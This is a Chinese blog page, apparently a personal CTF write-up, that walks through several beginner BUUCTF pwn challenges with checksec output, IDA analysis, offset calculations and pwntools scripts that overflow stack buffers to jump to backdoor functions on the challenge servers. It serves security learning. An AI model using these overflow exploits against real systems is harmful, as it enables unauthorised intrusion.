@@ -1,0 +1,672 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="G00d">
+
+
+    <meta name="subtitle" content="没有人会一直一帆风顺，失败和挫折才是人生常态">
+
+
+
+    <meta name="keywords" content="G00dddd">
+
+
+<title>CTF-刷PWN | G00d`s Blog</title>
+
+
+
+    <link rel="icon" href="../favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="../css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="../js/script.js"></script>
+    
+    <script src="../js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //创建雪花元素
+    function snow() {
+      //获取视窗的宽高
+      var width = window.innerWidth;
+      var height = window.innerHeight;
+  
+      var snow = document.createElement("div");             //创建元素
+  
+      //初始化雪花样式
+      size = Math.random() * 15 + 10;                          //随机生成雪花大小
+      snow.style.width = size + "px";
+      snow.style.height = size + "px";
+      snow.style.background = "url(img/雪花" + Math.floor((Math.random()*6)+1) + ".png) no-repeat";   //1-6随机选择雪花的图片
+      // snow.style.background = "url(./雪花.png) no-repeat";
+      snow.style.backgroundSize = '100% 100%';
+      snow.style.position = "fixed";                        //元素的位置相对于浏览器窗口是固定位置，即使窗口是滚动的它也不会移动
+      snow.style.filter = "blur(1px)";                      //给图片设置高斯模糊
+      snow.style.left = Math.random() * width + 'px';         //随机生成雪花的初始位置
+      snow.style.top = "10px";
+      snow.style.opacity = parseInt(Math.random()*10)/2;   //随机生成雪花的透明度
+  
+      //向body添加元素
+      document.body.appendChild(snow);
+  
+      //创建定时器，每30ms雪花下落一次
+      var timer = setInterval(function () {
+        snow.style.top = parseInt(snow.style.top) + 3 + 'px';     //每次下落3px
+  
+        //当雪花到达底部后清除元素
+        if (parseInt(snow.style.top) >= height) {
+          clearInterval(timer);
+          snow.parentNode.removeChild(snow)
+        }
+      }, 30)
+    }
+  
+    //页面加载完成执行函数
+    window.onload = function play() {
+      //创建定时器，每300ms生成一朵雪花
+      setInterval(function () {
+        snow()
+      }, 300)
+    }
+  </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //蜘蛛网特效
+    !
+    function() {
+        function n(n, e, t) {
+            return n.getAttribute(e) || t
+        }
+        function e(n) {
+            return document.getElementsByTagName(n)
+        }
+        function t() {
+            var t = e("script"),
+            o = t.length,
+            i = t[o - 1];
+            return {
+                l: o,
+                z: n(i, "zIndex", -1),
+                o: n(i, "opacity", .9),   //透明度
+                c: n(i, "color", "255, 102, 153"),   //颜色
+                n: n(i, "count", 99)
+            }
+        }
+        function o() {
+            a = m.width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth,
+            c = m.height = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight
+        }
+        function i() {
+            r.clearRect(0, 0, a, c);
+            var n, e, t, o, m, l;
+            s.forEach(function(i, x) {
+                for (i.x += i.xa, i.y += i.ya, i.xa *= i.x > a || i.x < 0 ? -1 : 1, i.ya *= i.y > c || i.y < 0 ? -1 : 1, r.fillRect(i.x - .5, i.y - .5, 1, 1), e = x + 1; e < u.length; e++) n = u[e],
+                null !== n.x && null !== n.y && (o = i.x - n.x, m = i.y - n.y, l = o * o + m * m, l < n.max && (n === y && l >= n.max / 2 && (i.x -= .03 * o, i.y -= .03 * m), t = (n.max - l) / n.max, r.beginPath(), r.lineWidth = t / 2, r.strokeStyle = "rgba(" + d.c + "," + (t + .2) + ")", r.moveTo(i.x, i.y), r.lineTo(n.x, n.y), r.stroke()))
+            }),
+            x(i)
+        }
+        var a, c, u, m = document.createElement("canvas"),
+        d = t(),
+        l = "c_n" + d.l,
+        r = m.getContext("2d"),
+        x = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame ||
+        function(n) {
+            window.setTimeout(n, 1e3 / 45)
+        },
+        w = Math.random,
+        y = {
+            x: null,
+            y: null,
+            max: 2e4
+        };
+        m.id = l,
+        m.style.cssText = "position:fixed;top:0;left:0;z-index:" + d.z + ";opacity:" + d.o,
+        e("body")[0].appendChild(m),
+        o(),
+        window.onresize = o,
+        window.onmousemove = function(n) {
+            n = n || window.event,
+            y.x = n.clientX,
+            y.y = n.clientY
+        },
+        window.onmouseout = function() {
+            y.x = null,
+            y.y = null
+        };
+        for (var s = [], f = 0; d.n > f; f++) {
+            var h = w() * a,
+            g = w() * c,
+            v = 2 * w() - 1,
+            p = 2 * w() - 1;
+            s.push({
+                x: h,
+                y: g,
+                xa: v,
+                ya: p,
+                max: 6e3
+            })
+        }
+        u = s.concat([y]),
+        setTimeout(function() {
+            i()
+        },
+        100)
+    } ();
+
+    //蜘蛛网特效
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">G00d&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">G00d&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">CTF-刷PWN</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">G00d</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十二月 2, 2024&nbsp;&nbsp;11:08:27</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="../categories/CTF/">CTF</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="test-your-nc-1"><a href="#test-your-nc-1" class="headerlink" title="test_your_nc 1"></a>test_your_nc 1</h1><h2 id="1-checkesc-检测文件的保护机制"><a href="#1-checkesc-检测文件的保护机制" class="headerlink" title="1. checkesc ,检测文件的保护机制."></a>1. checkesc ,检测文件的保护机制.</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">进入pwn环境，我的pwn环境在py3.<span class="number">12.7</span>的虚拟环境里</span><br><span class="line">checksec test   https:<span class="regexp">//</span>blog.csdn.net<span class="regexp">/weixin_42072280/</span>article<span class="regexp">/details/</span><span class="number">90229294</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/ctf-%E5%88%B7pwn//image-20241202131845937.png" alt="image-20241202131845937"></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>Relro：<span class="keyword">Full</span> Relro（重定位表只读）</span><br><span class="line">　　Relocation <span class="keyword">Read</span> <span class="keyword">Only</span>， 重定位表只读。重定位表即.got 和 .plt 两个表。</span><br><span class="line"><span class="number">2.</span>Stack：<span class="keyword">No</span> Canary <span class="built_in">found</span>（能栈溢出）</span><br><span class="line">　　Canary, 金丝雀。金丝雀原来是石油工人用来判断气体是否有毒。而应用于在栈保护上则是在初始化一个栈帧时在栈底（stack overflow 发生的高位区域的尾部）设置一个随机的 canary 值，当函数返回之时检测 canary 的值是否经过了改变，以此来判断 stack/buffer overflow 是否发生，若改变则说明栈溢出发生，程序走另一个流程结束，以免漏洞利用成功。 因此我们需要获取 Canary 的值，或者防止触发 stack_chk_fail 函数，或是利用此函数。</span><br><span class="line"><span class="number">3.</span>NX： NX <span class="keyword">enable</span>（不可执行内存）</span><br><span class="line">　　Non-Executable Memory，不可执行内存。了解 Linux 的都知道其文件有三种属性，即 rwx，而 NX 即没有 x 属性。如果没有 w 属性，我们就不能向内存单元中写入数据，如果没有 x 属性，写入的 shellcode 就无法执行。所以，我们此时应该使用其他方法来 pwn 掉程序，其中最常见的方法为 ROP (<span class="keyword">Return</span>-Oriented Programming 返回导向编程)，利用栈溢出在栈上布置地址，每个内存地址对应一个 gadget，利用 ret 等指令进行衔接来执行某项功能，最终达到 pwn 掉程序的目的。</span><br><span class="line"><span class="number">4.</span>PIE： PIE <span class="keyword">enable</span>（开启ASLR 地址随机化）</span><br><span class="line">　　Address space layout randomization，地址空间布局随机化。通过将数据随机放置来防止攻击。</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-静态分析，用IDA打开文件"><a href="#2-静态分析，用IDA打开文件" class="headerlink" title="2.静态分析，用IDA打开文件"></a>2.静态分析，用IDA打开文件</h2><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">按下shift+f12,打开<span class="keyword">string</span> <span class="built_in">window</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/ctf-%E5%88%B7pwn//image-20241202132215247.png" alt="image-20241202132215247"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">双击/bin/sh, 点击<span class="built_in">command</span>,然后键盘按一下X,发现/bin/sh的address在main</span><br></pre></td></tr></table></figure>
+
+<p><img src="/ctf-%E5%88%B7pwn//image-20241202133049093.png" alt="image-20241202133049093"><img src="/ctf-%E5%88%B7pwn//image-20241202133119257.png" alt="image-20241202133119257"></p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">双击进去，然后按<span class="built_in">F5</span>，就能看代码了</span><br></pre></td></tr></table></figure>
+
+<p><img src="/ctf-%E5%88%B7pwn//image-20241202133631231.png" alt="image-20241202133631231"></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">那我们直接nc连接一下  nc node5<span class="selector-class">.buuoj</span><span class="selector-class">.cn</span> <span class="number">25353</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/ctf-%E5%88%B7pwn//image-20241202134120251.png" alt="image-20241202134120251"></p>
+<h1 id="2-rip1"><a href="#2-rip1" class="headerlink" title="2.rip1"></a>2.rip1</h1><h2 id="1-checkesc-检测文件的保护机制-1"><a href="#1-checkesc-检测文件的保护机制-1" class="headerlink" title="1. checkesc ,检测文件的保护机制."></a>1. checkesc ,检测文件的保护机制.</h2><p><img src="/ctf-%E5%88%B7pwn//image-20241202161352621.png" alt="image-20241202161352621"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">意思说没有任何保护，程序是64位的，直接拿出IDA</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这道题跟上面第一个题一样，做题一模一样  </span><br></pre></td></tr></table></figure>
+
+<p><img src="/ctf-%E5%88%B7pwn//image-20241202162559650.png" alt="image-20241202162559650"></p>
+<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">诶我去，还不太一样，连接上之后发现输入内容会直接端口，再拿出IDA看看</span><br><span class="line">输入的字符串传给s，用puts输出出来，然后<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/ctf-%E5%88%B7pwn//image-20241203092509981.png" alt="image-20241203092509981"></p>
+<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查到的/bin/sh是在<span class="function"><span class="keyword">fun</span>函数里  通过栈溢出把返回地址改成这个<span class="keyword">fun</span>函数的地址就行了（0x401186</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/ctf-%E5%88%B7pwn//image-20241203092627934.png" alt="image-20241203092627934"></p>
+<p><img src="/ctf-%E5%88%B7pwn//image-20241203093107503.png" alt="image-20241203093107503"></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">算偏移量</span><br><span class="line">看地址算偏移量</span><br><span class="line">点进去<span class="selector-tag">main</span>函数里的输入字符串s，看到一共<span class="number">15</span>个字节，就是s能传<span class="number">15</span>个字符。双击s进去再看看发现<span class="number">2</span>个s之间有<span class="number">15</span>个db</span><br></pre></td></tr></table></figure>
+
+<p><img src="/ctf-%E5%88%B7pwn//image-20241203113802181.png" alt="image-20241203113802181"></p>
+<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">因此再回来看<span class="function"><span class="title">fun</span><span class="params">()</span></span>函数，就是一个系统调用，故payload=‘a’ * <span class="number">15</span> + p64(<span class="number">0x401186</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/ctf-%E5%88%B7pwn//image-20241203114111212.png" alt="image-20241203114111212"></p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">#p = process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">27430</span>)</span><br><span class="line">#elf =ELF(<span class="string">&quot;pwn1&quot;</span>)</span><br><span class="line">#fun_addr=elf.symbols[<span class="string">&#x27;fun&#x27;</span>]</span><br><span class="line">#buf_1= b<span class="string">&#x27;a&#x27;</span> * <span class="number">15</span> + p64(fun_addr)</span><br><span class="line"></span><br><span class="line">#p.recvuntil(<span class="string">&quot;please input&quot;</span>)  #这道题不知道为啥recvuntil报连接超时。。</span><br><span class="line"></span><br><span class="line">#buf_1 = b<span class="string">&#x27;a&#x27;</span> * (<span class="number">0xf</span> + <span class="number">0x8</span>) + p64(<span class="number">0x401198</span>) + p64(<span class="number">0x401186</span>) #也可以，是网上wp的修改</span><br><span class="line"></span><br><span class="line">buf_1 = b<span class="string">&#x27;a&#x27;</span> * <span class="number">15</span> + p64(<span class="number">0x401186</span>)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(buf_1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="3-warmup-csaw-20161"><a href="#3-warmup-csaw-20161" class="headerlink" title="3.warmup_csaw_20161"></a>3.warmup_csaw_20161</h1><h2 id="1-checkesc-检测文件的保护机制-2"><a href="#1-checkesc-检测文件的保护机制-2" class="headerlink" title="1. checkesc ,检测文件的保护机制."></a>1. checkesc ,检测文件的保护机制.</h2><p><img src="/ctf-%E5%88%B7pwn//image-20241203132339938.png" alt="image-20241203132339938"></p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">没有保护</span><br><span class="line">直接IDA看，看到了cat flag，函数是<span class="built_in">sub_40060D</span>()  如果我们能栈溢出到这里就ok了</span><br></pre></td></tr></table></figure>
+
+<p><img src="/ctf-%E5%88%B7pwn//image-20241203132526517.png" alt="image-20241203132526517"></p>
+<p><img src="/ctf-%E5%88%B7pwn//image-20241203132818066.png" alt="image-20241203132818066"></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们点击<span class="selector-tag">main</span>函数中gets存放输入数据的变量 s<span class="selector-attr">[64]</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/ctf-%E5%88%B7pwn//image-20241203133410671.png" alt="image-20241203133410671"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一共40位</span><br></pre></td></tr></table></figure>
+
+<p><img src="/ctf-%E5%88%B7pwn//image-20241203133455546.png" alt="image-20241203133455546"></p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这里s-<span class="attribute">r</span>的<span class="number">8</span>位存的是rbp地址。<span class="attribute">r</span>就是存返回地址并进行返回。</span><br><span class="line">v5大小为<span class="number">0</span>x40，s到<span class="attribute">r</span>有<span class="number">0</span>x8，也就是我们需要注入(<span class="number">0</span>x40 + <span class="number">0</span>x8)字节的数据，并在最后输入地址运行我们想要运行的函数。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">exp</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">#p = process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">28884</span>)</span><br><span class="line">#elf =ELF(<span class="string">&quot;pwn1&quot;</span>)</span><br><span class="line">#fun_addr=elf.symbols[<span class="string">&#x27;fun&#x27;</span>]</span><br><span class="line"></span><br><span class="line">sub_40060D=<span class="number">0x40060D</span></span><br><span class="line">payload = b<span class="string">&#x27;a&#x27;</span> * (<span class="number">0x40</span> + <span class="number">0x8</span>) + p64(sub_40060D)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/ctf-%E5%88%B7pwn//image-20241203134027015.png" alt="image-20241203134027015"></p>
+<h1 id="4-ciscn-2019-n-1"><a href="#4-ciscn-2019-n-1" class="headerlink" title="4.ciscn_2019_n_1"></a>4.ciscn_2019_n_1</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. checkesc ,检测文件的保护机制.  发现有NX　 NX <span class="built_in">enable</span>（不可执行内存）。但是对我们做题影响不大，依然是栈溢出，拿出IDA</span><br></pre></td></tr></table></figure>
+
+<p><img src="/ctf-%E5%88%B7pwn//image-20241204075810767.png" alt="image-20241204075810767"></p>
+<p><img src="/ctf-%E5%88%B7pwn//image-20241204075941330.png" alt="image-20241204075941330"></p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这就是程序思路，我们发现<span class="built_in">v1</span>和<span class="built_in">v2</span>处于同一个栈</span><br></pre></td></tr></table></figure>
+
+<p><img src="/ctf-%E5%88%B7pwn//image-20241204080225229.png" alt="image-20241204080225229"></p>
+<p><img src="/ctf-%E5%88%B7pwn//image-20241204080235689.png" alt="image-20241204080235689"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">v1</span>的地址信息包含了v2，那么只要输入长字符,然后溢出更改v2的值就好了.v1的首地址和v2的首地址相差<span class="number">44</span>位,发生<span class="number">44</span>个a然后再发送<span class="number">11</span>.<span class="number">28125</span>的<span class="number">16</span>进制数<span class="number">0</span>x41348000</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">payload</span>=b<span class="string">&quot;a&quot;</span>*<span class="number">44</span> +p64(<span class="number">0</span>x41348000)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">#p = process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">29899</span>)</span><br><span class="line">#elf =ELF(<span class="string">&quot;pwn1&quot;</span>)</span><br><span class="line">#fun_addr=elf.symbols[<span class="string">&#x27;fun&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=b<span class="string">&quot;a&quot;</span>*<span class="number">44</span> +p64(<span class="number">0x41348000</span>)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="5-pwn1-sctf-2016"><a href="#5-pwn1-sctf-2016" class="headerlink" title="5.pwn1_sctf_2016"></a>5.pwn1_sctf_2016</h1><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>. checkesc ,检测文件的保护机制.,发现是<span class="number">32</span>位的,用<span class="number">32</span>位的ida打开</span><br></pre></td></tr></table></figure>
+
+<p><img src="/ctf-%E5%88%B7pwn//image-20241204083726079.png" alt="image-20241204083726079"></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">main</span>函数就调用了一个函数vuln函数</span><br></pre></td></tr></table></figure>
+
+<p><img src="/ctf-%E5%88%B7pwn//image-20241204090249519.png" alt="image-20241204090249519"></p>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">注意看这个<span class="variable">fgets</span>函数<span class="operator">,</span>最高接受<span class="number">32</span>个字节<span class="operator">.</span>另外我们发现<span class="type">get_flag</span>函数  <span class="variable">s</span>距离栈底是<span class="number">0</span><span class="variable">x3c</span>也就是<span class="number">60</span>个字节<span class="operator">.</span>这根本溢不过去</span><br><span class="line">看上面的代码  程序把用户输入的<span class="built_in">I</span>换成<span class="variable">you</span>。那就是说会自动帮我们把<span class="number">1</span>字节变<span class="number">3</span>字节，我们可以利用填充<span class="built_in">I</span>来让程序自动填充到返回地址前。<span class="variable">s</span>距离<span class="variable">ebp</span>是<span class="number">0</span><span class="variable">x3c</span>也就是<span class="number">60</span>个字节，那么我们填充<span class="number">20</span>个<span class="built_in">I</span>再加<span class="number">4</span>个字节填充接着拼接我们的后门地址。</span><br><span class="line"><span class="variable">payload</span><span class="operator">=</span><span class="variable">b</span><span class="operator">&#x27;</span><span class="built_in">I</span><span class="operator">&#x27;*</span><span class="number">20</span><span class="operator">+</span><span class="variable">b</span><span class="operator">&#x27;</span><span class="variable">A</span><span class="operator">&#x27;*</span><span class="number">4</span> <span class="operator">+</span> <span class="variable">p32</span><span class="punctuation">(</span><span class="type">get_flag</span><span class="type">_addr</span><span class="punctuation">)</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">#p = process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">27173</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn1_sctf_2016&quot;</span>)</span><br><span class="line">get_flag_addr = elf.symbols[<span class="string">&quot;get_flag&quot;</span>]</span><br><span class="line">#print (get_flag_addr)</span><br><span class="line">payload=b<span class="string">&#x27;I&#x27;</span>*<span class="number">20</span>+b<span class="string">&#x27;A&#x27;</span>*<span class="number">4</span> + p32(get_flag_addr)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="6-jarvisoj-level0"><a href="#6-jarvisoj-level0" class="headerlink" title="6.jarvisoj_level0"></a>6.jarvisoj_level0</h1><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> checkesc ,检测文件的保护机制.</span><br></pre></td></tr></table></figure>
+
+<p><img src="/ctf-%E5%88%B7pwn//image-20241204093336754.png" alt="image-20241204093336754"></p>
